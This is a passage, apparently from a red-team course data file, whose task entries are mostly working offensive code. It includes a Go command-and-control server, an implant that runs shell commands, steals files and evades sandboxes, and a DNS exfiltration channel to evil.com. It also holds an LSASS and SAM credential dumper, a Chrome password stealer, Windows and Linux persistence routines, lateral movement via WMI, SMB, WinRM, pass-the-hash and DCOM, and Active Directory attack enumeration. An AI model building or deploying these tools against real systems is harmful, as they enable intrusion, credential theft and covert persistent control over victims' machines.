┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
│ HTTP/S      │ │ Agent DB    │ │ Task DB     │ │ Web UI /    │
│ DNS         │ │ (SQLite)    │ │             │ │ CLI Client  │
│ TCP         │ │             │ │             │ │             │
└─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘
\`\`\`

### Core Server Implementation

\`\`\`go
package main

import (
    "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "sync"
    "time"
)

type Agent struct {
    ID         string    \`json:"id"\`
    Hostname   string    \`json:"hostname"\`
    Username   string    \`json:"username"\`
    OS         string    \`json:"os"\`
    Arch       string    \`json:"arch"\`
    PID        int       \`json:"pid"\`
    LastSeen   time.Time \`json:"last_seen"\`
    ExternalIP string    \`json:"external_ip"\`
}

type Task struct {
    ID        string    \`json:"id"\`
    AgentID   string    \`json:"agent_id"\`
    Command   string    \`json:"command"\`
    Args      []string  \`json:"args"\`
    Status    string    \`json:"status"\`
    Output    string    \`json:"output"\`
    CreatedAt time.Time \`json:"created_at"\`
}

type C2Server struct {
    agents   map[string]*Agent
    tasks    map[string][]*Task
    mu       sync.RWMutex
}

func NewC2Server() *C2Server {
    return &C2Server{
        agents: make(map[string]*Agent),
        tasks:  make(map[string][]*Task),
    }
}

func generateID() string {
    b := make([]byte, 8)
    rand.Read(b)
    return hex.EncodeToString(b)
}

// Agent checkin endpoint
func (c *C2Server) handleCheckin(w http.ResponseWriter, r *http.Request) {
    var agent Agent
    if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
        http.Error(w, "Invalid request", 400)
        return
    }

    c.mu.Lock()
    if agent.ID == "" {
        // New agent registration
        agent.ID = generateID()
        agent.LastSeen = time.Now()
        agent.ExternalIP = r.RemoteAddr
        c.agents[agent.ID] = &agent
        log.Printf("[+] New agent: %s (%s@%s)",
            agent.ID, agent.Username, agent.Hostname)
    } else {
        // Existing agent checkin
        if existing, ok := c.agents[agent.ID]; ok {
            existing.LastSeen = time.Now()
        }
    }
    c.mu.Unlock()

    // Return pending tasks
    c.mu.RLock()
    pendingTasks := []*Task{}
    for _, task := range c.tasks[agent.ID] {
        if task.Status == "pending" {
            pendingTasks = append(pendingTasks, task)
        }
    }
    c.mu.RUnlock()

    response := map[string]interface{}{
        "agent_id": agent.ID,
        "tasks":    pendingTasks,
    }
    json.NewEncoder(w).Encode(response)
}

// Task result endpoint
func (c *C2Server) handleTaskResult(w http.ResponseWriter, r *http.Request) {
    var result struct {
        TaskID string \`json:"task_id"\`
        Output string \`json:"output"\`
        Error  string \`json:"error"\`
    }

    if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
        http.Error(w, "Invalid request", 400)
        return
    }

    c.mu.Lock()
    for _, tasks := range c.tasks {
        for _, task := range tasks {
            if task.ID == result.TaskID {
                task.Status = "completed"
                task.Output = result.Output
                if result.Error != "" {
                    task.Status = "failed"
                    task.Output = result.Error
                }
                log.Printf("[*] Task %s completed", task.ID)
            }
        }
    }
    c.mu.Unlock()

    w.WriteHeader(200)
}

// Operator API - List agents
func (c *C2Server) handleListAgents(w http.ResponseWriter, r *http.Request) {
    c.mu.RLock()
    agents := make([]*Agent, 0, len(c.agents))
    for _, agent := range c.agents {
        agents = append(agents, agent)
    }
    c.mu.RUnlock()

    json.NewEncoder(w).Encode(agents)
}

// Operator API - Queue task
func (c *C2Server) handleQueueTask(w http.ResponseWriter, r *http.Request) {
    var req struct {
        AgentID string   \`json:"agent_id"\`
        Command string   \`json:"command"\`
        Args    []string \`json:"args"\`
    }

    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        http.Error(w, "Invalid request", 400)
        return
    }

    task := &Task{
        ID:        generateID(),
        AgentID:   req.AgentID,
        Command:   req.Command,
        Args:      req.Args,
        Status:    "pending",
        CreatedAt: time.Now(),
    }

    c.mu.Lock()
    c.tasks[req.AgentID] = append(c.tasks[req.AgentID], task)
    c.mu.Unlock()

    log.Printf("[*] Queued task %s for agent %s: %s",
        task.ID, req.AgentID, req.Command)

    json.NewEncoder(w).Encode(task)
}

func main() {
    server := NewC2Server()

    // Agent endpoints (should be on different port/domain in prod)
    http.HandleFunc("/api/checkin", server.handleCheckin)
    http.HandleFunc("/api/result", server.handleTaskResult)

    // Operator endpoints
    http.HandleFunc("/operator/agents", server.handleListAgents)
    http.HandleFunc("/operator/task", server.handleQueueTask)

    log.Println("C2 Server starting on :8443")
    log.Fatal(http.ListenAndServeTLS(":8443", "cert.pem", "key.pem", nil))
}
\`\`\`

### Features to Add
1. **Encryption** - AES-GCM for task/response encryption
2. **Authentication** - Agent authentication tokens
3. **Persistence** - SQLite for agent/task storage
4. **Multiple protocols** - HTTP, DNS, TCP listeners
5. **Malleable profiles** - Customize traffic patterns`
				},
				{
					title: 'Build a Cross-Platform Implant/Agent',
					description: 'Go implant with command execution and evasion capabilities',
					details: `## Cross-Platform Implant in Go

### Why Go for Implants?
- Cross-compile to Windows/Linux/macOS
- Single static binary
- No runtime dependencies
- Good obfuscation options

### Basic Implant Structure

\`\`\`go
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "time"
)

var (
    C2Server  = "https://c2.example.com"
    Sleep     = 30 * time.Second
    Jitter    = 0.2 // 20% jitter
    AgentID   string
    AESKey    = []byte("0123456789abcdef") // Replace with proper key exchange
)

type AgentInfo struct {
    ID       string \`json:"id"\`
    Hostname string \`json:"hostname"\`
    Username string \`json:"username"\`
    OS       string \`json:"os"\`
    Arch     string \`json:"arch"\`
    PID      int    \`json:"pid"\`
}

type Task struct {
    ID      string   \`json:"id"\`
    Command string   \`json:"command"\`
    Args    []string \`json:"args"\`
}

type TaskResult struct {
    TaskID string \`json:"task_id"\`
    Output string \`json:"output"\`
    Error  string \`json:"error"\`
}

func getAgentInfo() AgentInfo {
    hostname, _ := os.Hostname()
    currentUser, _ := user.Current()

    return AgentInfo{
        ID:       AgentID,
        Hostname: hostname,
        Username: currentUser.Username,
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
        PID:      os.Getpid(),
    }
}

func checkin() ([]Task, error) {
    info := getAgentInfo()
    data, _ := json.Marshal(info)

    resp, err := http.Post(C2Server+"/api/checkin",
        "application/json",
        bytes.NewReader(data))
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var response struct {
        AgentID string \`json:"agent_id"\`
        Tasks   []Task \`json:"tasks"\`
    }

    if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
        return nil, err
    }

    if AgentID == "" {
        AgentID = response.AgentID
    }

    return response.Tasks, nil
}

func sendResult(result TaskResult) error {
    data, _ := json.Marshal(result)

    _, err := http.Post(C2Server+"/api/result",
        "application/json",
        bytes.NewReader(data))
    return err
}

func executeCommand(command string, args []string) (string, error) {
    var cmd *exec.Cmd

    switch command {
    case "shell":
        if runtime.GOOS == "windows" {
            cmd = exec.Command("cmd", append([]string{"/c"}, args...)...)
        } else {
            cmd = exec.Command("/bin/sh", append([]string{"-c"}, args...)...)
        }

    case "download":
        // Download file from target
        if len(args) < 1 {
            return "", fmt.Errorf("usage: download <path>")
        }
        content, err := os.ReadFile(args[0])
        if err != nil {
            return "", err
        }
        return string(content), nil

    case "upload":
        // Upload file to target
        if len(args) < 2 {
            return "", fmt.Errorf("usage: upload <path> <content>")
        }
        err := os.WriteFile(args[0], []byte(args[1]), 0644)
        if err != nil {
            return "", err
        }
        return "File written", nil

    case "pwd":
        dir, _ := os.Getwd()
        return dir, nil

    case "cd":
        if len(args) < 1 {
            return "", fmt.Errorf("usage: cd <path>")
        }
        return "", os.Chdir(args[0])

    case "ps":
        // List processes (platform specific)
        return listProcesses()

    case "exit":
        os.Exit(0)

    default:
        return "", fmt.Errorf("unknown command: %s", command)
    }

    if cmd != nil {
        output, err := cmd.CombinedOutput()
        return string(output), err
    }

    return "", nil
}

func calculateSleep() time.Duration {
    jitterRange := float64(Sleep) * Jitter
    jitterValue := (rand.Float64() * 2 - 1) * jitterRange
    return Sleep + time.Duration(jitterValue)
}

func main() {
    // Initial delay to avoid sandbox detection
    time.Sleep(5 * time.Second)

    for {
        tasks, err := checkin()
        if err != nil {
            time.Sleep(calculateSleep())
            continue
        }

        for _, task := range tasks {
            output, err := executeCommand(task.Command, task.Args)

            result := TaskResult{TaskID: task.ID, Output: output}
            if err != nil {
                result.Error = err.Error()
            }

            sendResult(result)
        }

        time.Sleep(calculateSleep())
    }
}
\`\`\`

### Build Commands

\`\`\`bash
# Windows (64-bit)
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe

# Linux (64-bit)
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent

# macOS (Apple Silicon)
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o agent_mac

# With garble for obfuscation
garble -literals -tiny build -o agent.exe
\`\`\`

### Evasion Techniques
1. **Sleep with jitter** - Avoid regular beacon patterns
2. **Process injection** - Run in legitimate process
3. **Encrypted comms** - AES-GCM encryption
4. **Domain fronting** - Hide C2 destination
5. **User-agent rotation** - Blend with normal traffic`
				},
				{
					title: 'Build a DNS C2 Channel',
					description: 'Covert communication over DNS queries',
					details: `## DNS C2 Channel in Go

### Why DNS C2?
- Passes through most firewalls
- Blends with normal traffic
- Hard to block without breaking internet

### Architecture
\`\`\`
Agent                              DNS C2 Server
  │                                     │
  │─── TXT query: cmd.evil.com ────────▶│
  │◀── TXT response: base64(task) ──────│
  │                                     │
  │─── A query: result.evil.com ───────▶│
  │    (data encoded in subdomain)      │
  │◀── A response: 1.2.3.4 (ack) ───────│
\`\`\`

### DNS C2 Server

\`\`\`go
package main

import (
    "encoding/base64"
    "fmt"
    "log"
    "strings"
    "sync"

    "github.com/miekg/dns"
)

type DNSC2 struct {
    domain     string
    agents     map[string]*Agent
    taskQueues map[string][]string
    results    map[string][]string
    mu         sync.RWMutex
}

func NewDNSC2(domain string) *DNSC2 {
    return &DNSC2{
        domain:     domain,
        agents:     make(map[string]*Agent),
        taskQueues: make(map[string][]string),
        results:    make(map[string][]string),
    }
}

func (c *DNSC2) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
    m := new(dns.Msg)
    m.SetReply(r)

    for _, q := range r.Question {
        name := strings.ToLower(q.Name)
        log.Printf("Query: %s %s", dns.TypeToString[q.Qtype], name)

        switch q.Qtype {
        case dns.TypeTXT:
            // Agent requesting tasks
            c.handleTaskRequest(m, name)

        case dns.TypeA:
            // Agent sending data
            c.handleDataExfil(m, name)

        case dns.TypeAAAA:
            // Agent registration
            c.handleRegistration(m, name)
        }
    }

    w.WriteMsg(m)
}

func (c *DNSC2) handleTaskRequest(m *dns.Msg, name string) {
    // Format: <agent_id>.cmd.<domain>
    parts := strings.Split(name, ".")
    if len(parts) < 3 {
        return
    }

    agentID := parts[0]

    c.mu.Lock()
    tasks := c.taskQueues[agentID]
    var task string
    if len(tasks) > 0 {
        task = tasks[0]
        c.taskQueues[agentID] = tasks[1:]
    } else {
        task = "nop" // No operation
    }
    c.mu.Unlock()

    // Encode task in TXT record
    encoded := base64.StdEncoding.EncodeToString([]byte(task))

    rr := &dns.TXT{
        Hdr: dns.RR_Header{
            Name:   name,
            Rrtype: dns.TypeTXT,
            Class:  dns.ClassINET,
            Ttl:    0,
        },
        Txt: []string{encoded},
    }
    m.Answer = append(m.Answer, rr)
}

func (c *DNSC2) handleDataExfil(m *dns.Msg, name string) {
    // Format: <base64_chunk>.<chunk_num>.<agent_id>.data.<domain>
    parts := strings.Split(name, ".")
    if len(parts) < 5 {
        return
    }

    data := parts[0]
    chunkNum := parts[1]
    agentID := parts[2]

    decoded, err := base64.RawURLEncoding.DecodeString(data)
    if err != nil {
        return
    }

    c.mu.Lock()
    c.results[agentID] = append(c.results[agentID],
        fmt.Sprintf("%s:%s", chunkNum, string(decoded)))
    c.mu.Unlock()

    log.Printf("Received chunk %s from %s: %s", chunkNum, agentID, decoded)

    // Acknowledge with valid A record
    rr := &dns.A{
        Hdr: dns.RR_Header{
            Name:   name,
            Rrtype: dns.TypeA,
            Class:  dns.ClassINET,
            Ttl:    0,
        },
        A: net.ParseIP("127.0.0.1"),
    }
    m.Answer = append(m.Answer, rr)
}

func (c *DNSC2) QueueTask(agentID, task string) {
    c.mu.Lock()
    c.taskQueues[agentID] = append(c.taskQueues[agentID], task)
    c.mu.Unlock()
}

func main() {
    c2 := NewDNSC2("evil.com.")

    dns.HandleFunc("evil.com.", c2.handleDNS)

    go func() {
        srv := &dns.Server{Addr: ":53", Net: "udp"}
        if err := srv.ListenAndServe(); err != nil {
            log.Fatal(err)
        }
    }()

    // Example: queue a task
    c2.QueueTask("agent1", "shell whoami")

    select {}
}
\`\`\`

### DNS Agent (Client)

\`\`\`go
func dnsCheckin(agentID, domain string) (string, error) {
    // Query for tasks
    query := fmt.Sprintf("%s.cmd.%s", agentID, domain)

    m := new(dns.Msg)
    m.SetQuestion(query, dns.TypeTXT)

    c := new(dns.Client)
    r, _, err := c.Exchange(m, "8.8.8.8:53") // Use real DNS
    if err != nil {
        return "", err
    }

    for _, ans := range r.Answer {
        if txt, ok := ans.(*dns.TXT); ok {
            decoded, _ := base64.StdEncoding.DecodeString(txt.Txt[0])
            return string(decoded), nil
        }
    }

    return "", nil
}

func dnsSendData(agentID, domain, data string) error {
    // Chunk data and send via A queries
    encoded := base64.RawURLEncoding.EncodeToString([]byte(data))

    chunkSize := 63 // Max subdomain label length
    for i := 0; i < len(encoded); i += chunkSize {
        end := i + chunkSize
        if end > len(encoded) {
            end = len(encoded)
        }

        chunk := encoded[i:end]
        query := fmt.Sprintf("%s.%d.%s.data.%s",
            chunk, i/chunkSize, agentID, domain)

        m := new(dns.Msg)
        m.SetQuestion(query, dns.TypeA)

        c := new(dns.Client)
        c.Exchange(m, "8.8.8.8:53")

        time.Sleep(100 * time.Millisecond) // Rate limit
    }

    return nil
}
\`\`\``
				}
			]
		},
		{
			name: 'Post-Exploitation',
			description: 'Tools for maintaining access and gathering information after initial compromise',
			tasks: [
				{
					title: 'Build a Credential Dumper',
					description: 'Extract passwords, hashes, and tokens from compromised systems',
					details: `## Credential Extraction Techniques

### Windows Credential Locations
- SAM database (local accounts)
- LSASS process memory (domain creds)
- DPAPI protected files
- Browser credential stores
- Cached credentials

### LSASS Memory Dumping (Go + Windows API)

\`\`\`go
// +build windows

package main

import (
    "fmt"
    "os"
    "syscall"
    "unsafe"
)

var (
    kernel32         = syscall.NewLazyDLL("kernel32.dll")
    dbghelp          = syscall.NewLazyDLL("dbghelp.dll")
    openProcess      = kernel32.NewProc("OpenProcess")
    miniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
)

const (
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MiniDumpWithFullMemory = 0x00000002
)

func findLsassPID() (uint32, error) {
    // Use CreateToolhelp32Snapshot to find lsass.exe
    // Implementation details...
    return 0, nil
}

func dumpLSASS(outputPath string) error {
    pid, err := findLsassPID()
    if err != nil {
        return err
    }

    hProcess, _, _ := openProcess.Call(
        PROCESS_ALL_ACCESS,
        0,
        uintptr(pid),
    )
    if hProcess == 0 {
        return fmt.Errorf("failed to open process")
    }
    defer syscall.CloseHandle(syscall.Handle(hProcess))

    f, err := os.Create(outputPath)
    if err != nil {
        return err
    }
    defer f.Close()

    ret, _, _ := miniDumpWriteDump.Call(
        hProcess,
        uintptr(pid),
        f.Fd(),
        MiniDumpWithFullMemory,
        0, 0, 0,
    )

    if ret == 0 {
        return fmt.Errorf("MiniDumpWriteDump failed")
    }

    return nil
}
\`\`\`

### SAM/SYSTEM Registry Extraction

\`\`\`go
func dumpSAM() error {
    // Save SAM and SYSTEM hives
    commands := []struct {
        hive string
        path string
    }{
        {"SAM", "C:\\\\Windows\\\\Temp\\\\sam.save"},
        {"SYSTEM", "C:\\\\Windows\\\\Temp\\\\system.save"},
        {"SECURITY", "C:\\\\Windows\\\\Temp\\\\security.save"},
    }

    for _, cmd := range commands {
        exec.Command("reg", "save",
            fmt.Sprintf("HKLM\\\\%s", cmd.hive),
            cmd.path).Run()
    }

    return nil
}
\`\`\`

### Chrome Password Extraction (Python)

\`\`\`python
import os
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
import win32crypt

def get_chrome_key():
    """Get Chrome's encryption key from Local State."""
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Google', 'Chrome', 'User Data', 'Local State'
    )

    with open(local_state_path, 'r') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(
        local_state['os_crypt']['encrypted_key']
    )[5:]  # Remove DPAPI prefix

    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    """Decrypt Chrome password."""
    iv = encrypted_password[3:15]
    payload = encrypted_password[15:]

    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()

def dump_chrome_passwords():
    """Extract all saved Chrome passwords."""
    key = get_chrome_key()

    db_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
    )

    # Copy database (Chrome locks it)
    temp_db = 'temp_login_data.db'
    shutil.copy(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    cursor.execute('''
        SELECT origin_url, username_value, password_value
        FROM logins
    ''')

    credentials = []
    for url, username, encrypted_password in cursor.fetchall():
        if encrypted_password:
            try:
                password = decrypt_password(encrypted_password, key)
                credentials.append({
                    'url': url,
                    'username': username,
                    'password': password
                })
            except:
                pass

    conn.close()
    os.remove(temp_db)

    return credentials

if __name__ == '__main__':
    creds = dump_chrome_passwords()
    for c in creds:
        print(f"{c['url']}  {c['username']}:{c['password']}")
\`\`\`

### Operational Security
- Only dump what you need
- Clean up dump files
- Use in-memory only when possible
- Be aware of EDR/AV hooks on APIs`
				},
				{
					title: 'Build a Persistence Toolkit',
					description: 'Implement various persistence mechanisms for Windows/Linux',
					details: `## Persistence Mechanisms

### Windows Persistence Options

#### Registry Run Keys
\`\`\`go
func addRunKey(name, path string) error {
    key, _, err := registry.CreateKey(
        registry.CURRENT_USER,
        \`Software\\Microsoft\\Windows\\CurrentVersion\\Run\`,
        registry.SET_VALUE)
    if err != nil {
        return err
    }
    defer key.Close()

    return key.SetStringValue(name, path)
}
\`\`\`

#### Scheduled Tasks
\`\`\`go
func createScheduledTask(name, path string) error {
    cmd := exec.Command("schtasks", "/create",
        "/tn", name,
        "/tr", path,
        "/sc", "onlogon",
        "/ru", "SYSTEM",
        "/f")

    return cmd.Run()
}
\`\`\`

#### WMI Event Subscription
\`\`\`go
func wmiPersistence(name, command string) error {
    // Create WMI event filter
    filterQuery := fmt.Sprintf(\`
        $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
            Name = '%s_filter'
            EventNamespace = 'root/cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
    \`, name)

    // Create WMI consumer
    consumerQuery := fmt.Sprintf(\`
        $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
            Name = '%s_consumer'
            CommandLineTemplate = '%s'
        }
    \`, name, command)

    // Bind them
    bindQuery := \`
        Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
    \`

    script := filterQuery + consumerQuery + bindQuery
    cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-Command", script)
    return cmd.Run()
}
\`\`\`

#### Service Installation
\`\`\`go
func installService(name, displayName, binPath string) error {
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()

    s, err := m.CreateService(name,
        binPath,
        mgr.Config{
            DisplayName: displayName,
            StartType:   mgr.StartAutomatic,
        })
    if err != nil {
        return err
    }
    defer s.Close()

    return s.Start()
}
\`\`\`

### Linux Persistence Options

#### Cron Job
\`\`\`go
func addCronJob(schedule, command string) error {
    // Get existing crontab
    out, _ := exec.Command("crontab", "-l").Output()

    // Add new job
    newCron := string(out) + fmt.Sprintf("\\n%s %s\\n", schedule, command)

    cmd := exec.Command("crontab", "-")
    cmd.Stdin = strings.NewReader(newCron)
    return cmd.Run()
}
\`\`\`

#### Systemd Service
\`\`\`go
func createSystemdService(name, execPath string) error {
    serviceContent := fmt.Sprintf(\`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
\`, name, execPath)

    servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", name)
    if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
        return err
    }

    exec.Command("systemctl", "daemon-reload").Run()
    exec.Command("systemctl", "enable", name).Run()
    return exec.Command("systemctl", "start", name).Run()
}
\`\`\`

#### SSH Authorized Keys
\`\`\`go
func addSSHKey(publicKey string) error {
    usr, _ := user.Current()
    sshDir := filepath.Join(usr.HomeDir, ".ssh")
    authKeysPath := filepath.Join(sshDir, "authorized_keys")

    os.MkdirAll(sshDir, 0700)

    f, err := os.OpenFile(authKeysPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
    if err != nil {
        return err
    }
    defer f.Close()

    _, err = f.WriteString(publicKey + "\\n")
    return err
}
\`\`\`

### Persistence Detection Evasion
- Use legitimate-looking names
- Match timestamps with system files
- Avoid common persistence locations
- Consider userland rootkit techniques`
				},
				{
					title: 'Build a Lateral Movement Toolkit',
					description: 'WMI, PSExec, WinRM automation for network propagation',
					details: `## Lateral Movement Techniques

### WMI Remote Execution

\`\`\`go
func wmiExec(target, username, password, command string) (string, error) {
    // Using wmic command (simpler approach)
    cmd := exec.Command("wmic",
        "/node:"+target,
        "/user:"+username,
        "/password:"+password,
        "process", "call", "create", command)

    output, err := cmd.CombinedOutput()
    return string(output), err
}

// Alternative: Use Go WMI bindings
func wmiExecNative(target, username, password, command string) error {
    // Connect to remote WMI
    // Implementation using go-ole or similar
    return nil
}
\`\`\`

### PSExec-style Execution

\`\`\`go
func psexecStyle(target, username, password, command string) error {
    // 1. Connect to target's ADMIN$ share
    // 2. Copy service binary
    // 3. Create and start service
    // 4. Capture output via named pipe
    // 5. Clean up

    // Connect to share
    sharePath := fmt.Sprintf("\\\\\\\\%s\\\\ADMIN$", target)

    // Use SMB library (e.g., github.com/hirochachacha/go-smb2)
    conn, err := smb2.Dial(target+":445")
    if err != nil {
        return err
    }
    defer conn.Close()

    session, err := conn.NTLMSSPClient(username, password)
    if err != nil {
        return err
    }

    share, err := session.Mount("ADMIN$")
    if err != nil {
        return err
    }

    // Copy payload
    payload, _ := os.ReadFile("payload.exe")
    share.WriteFile("payload.exe", payload, 0755)

    // Create service (requires RPC)
    // ...

    return nil
}
\`\`\`

### WinRM Execution

\`\`\`go
func winrmExec(target, username, password, command string) (string, error) {
    endpoint := winrm.NewEndpoint(target, 5985, false, false, nil, nil, nil, 0)

    client, err := winrm.NewClient(endpoint, username, password)
    if err != nil {
        return "", err
    }

    var stdout, stderr bytes.Buffer
    _, err = client.Run(command, &stdout, &stderr)

    return stdout.String() + stderr.String(), err
}
\`\`\`

### Pass-the-Hash

\`\`\`python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import scmr

def pth_exec(target, username, nthash, command):
    """Execute command using pass-the-hash."""
    # Connect with NTLM hash
    conn = SMBConnection(target, target)
    conn.login(username, '', '', nthash)

    # Access service control manager
    rpctransport = transport.SMBTransport(
        target, 445, 'svcctl',
        smb_connection=conn)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)

    # Create and start service
    ans = scmr.hROpenSCManagerW(dce)
    scHandle = ans['lpScHandle']

    ans = scmr.hRCreateServiceW(
        dce, scHandle, 'TempService', 'Temp',
        lpBinaryPathName=command,
        dwStartType=scmr.SERVICE_DEMAND_START)

    serviceHandle = ans['lpServiceHandle']
    scmr.hRStartServiceW(dce, serviceHandle)

    # Clean up
    scmr.hRDeleteService(dce, serviceHandle)
    scmr.hRCloseServiceHandle(dce, serviceHandle)
\`\`\`

### DCOM Execution

\`\`\`python
from impacket.dcerpc.v5.dcom import oaut
from impacket.dcerpc.v5.dcomrt import DCOMConnection

def dcom_exec(target, username, password, command):
    """Execute via DCOM MMC20.Application."""
    dcom = DCOMConnection(target, username, password)

    iInterface = dcom.CoCreateInstanceEx(
        "49B2791A-B1AE-4C90-9B8E-E860BA07F889",  # MMC20
        "000001A0-0000-0000-C000-000000000046")   # IUnknown

    iMMC = iInterface.QueryInterface("00000000-0000-0000-C000-000000000046")

    # Call Document.ActiveView.ExecuteShellCommand
    iDocument = iMMC.QueryInterface("...")
    # ... implementation
\`\`\``
				}
			]
		},
		{
			name: 'Active Directory Attacks',
			description: 'Tools for attacking and exploiting Active Directory environments',
			tasks: [
				{
					title: 'Build an LDAP Enumerator',
					description: 'Fast AD object enumeration with Go',
					details: `## LDAP Enumeration Tool

### Features
- User/group/computer enumeration
- Privileged account discovery
- Password policy extraction
- Trust relationships

### Implementation

\`\`\`go
package main

import (
    "crypto/tls"
    "fmt"
    "log"

    "github.com/go-ldap/ldap/v3"
)

type ADEnumerator struct {
    conn     *ldap.Conn
    baseDN   string
    domain   string
}

func NewADEnumerator(server, username, password, domain string) (*ADEnumerator, error) {
    // Connect with TLS
    tlsConfig := &tls.Config{InsecureSkipVerify: true}
    conn, err := ldap.DialTLS("tcp", server+":636", tlsConfig)
    if err != nil {
        // Fall back to StartTLS
        conn, err = ldap.Dial("tcp", server+":389")
        if err != nil {
            return nil, err
        }
        conn.StartTLS(tlsConfig)
    }

    // Bind
    bindDN := fmt.Sprintf("%s@%s", username, domain)
    if err := conn.Bind(bindDN, password); err != nil {
        return nil, err
    }

    // Convert domain to base DN
    baseDN := domainToBaseDN(domain)

    return &ADEnumerator{
        conn:   conn,
        baseDN: baseDN,
        domain: domain,
    }, nil
}

func domainToBaseDN(domain string) string {
    parts := strings.Split(domain, ".")
    dn := ""
    for i, part := range parts {
        if i > 0 {
            dn += ","
        }
        dn += "DC=" + part
    }
    return dn
}

func (e *ADEnumerator) GetAllUsers() ([]map[string]string, error) {
    searchRequest := ldap.NewSearchRequest(
        e.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(&(objectCategory=person)(objectClass=user))",
        []string{
            "sAMAccountName",
            "displayName",
            "mail",
            "memberOf",
            "pwdLastSet",
            "lastLogon",
            "userAccountControl",
            "description",
        },
        nil,
    )

    result, err := e.conn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    users := []map[string]string{}
    for _, entry := range result.Entries {
        user := map[string]string{
            "dn":           entry.DN,
            "username":     entry.GetAttributeValue("sAMAccountName"),
            "displayName":  entry.GetAttributeValue("displayName"),
            "email":        entry.GetAttributeValue("mail"),
            "description":  entry.GetAttributeValue("description"),
            "pwdLastSet":   entry.GetAttributeValue("pwdLastSet"),
            "lastLogon":    entry.GetAttributeValue("lastLogon"),
            "uac":          entry.GetAttributeValue("userAccountControl"),
        }
        users = append(users, user)
    }

    return users, nil
}

func (e *ADEnumerator) GetDomainAdmins() ([]string, error) {
    searchRequest := ldap.NewSearchRequest(
        e.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(&(objectCategory=group)(cn=Domain Admins))",
        []string{"member"},
        nil,
    )

    result, err := e.conn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    members := []string{}
    for _, entry := range result.Entries {
        for _, member := range entry.GetAttributeValues("member") {
            members = append(members, member)
        }
    }

    return members, nil
}

func (e *ADEnumerator) GetKerberoastableUsers() ([]map[string]string, error) {
    // Find users with SPNs (Kerberoastable)
    searchRequest := ldap.NewSearchRequest(
        e.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
        []string{"sAMAccountName", "servicePrincipalName", "memberOf"},
        nil,
    )

    result, err := e.conn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    users := []map[string]string{}
    for _, entry := range result.Entries {
        user := map[string]string{
            "username": entry.GetAttributeValue("sAMAccountName"),
            "spn":      entry.GetAttributeValues("servicePrincipalName")[0],
        }

        // Check if in privileged group
        for _, group := range entry.GetAttributeValues("memberOf") {
            if strings.Contains(group, "Admin") {
                user["privileged"] = "true"
            }
        }

        users = append(users, user)
    }

    return users, nil
}

func (e *ADEnumerator) GetASREPRoastableUsers() ([]string, error) {
    // Find users with "Do not require Kerberos preauthentication"
    // UAC flag: DONT_REQ_PREAUTH = 0x400000
    searchRequest := ldap.NewSearchRequest(
        e.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
        []string{"sAMAccountName"},
        nil,
    )

    result, err := e.conn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    users := []string{}
    for _, entry := range result.Entries {
        users = append(users, entry.GetAttributeValue("sAMAccountName"))
    }

    return users, nil
}

func main() {
    enum, err := NewADEnumerator(
        "dc01.corp.local",
        "user",
        "password",
        "corp.local")
    if err != nil {
        log.Fatal(err)
    }

    fmt.Println("=== Domain Admins ===")
    admins, _ := enum.GetDomainAdmins()
    for _, admin := range admins {
        fmt.Println(admin)
    }

    fmt.Println("\\n=== Kerberoastable Users ===")
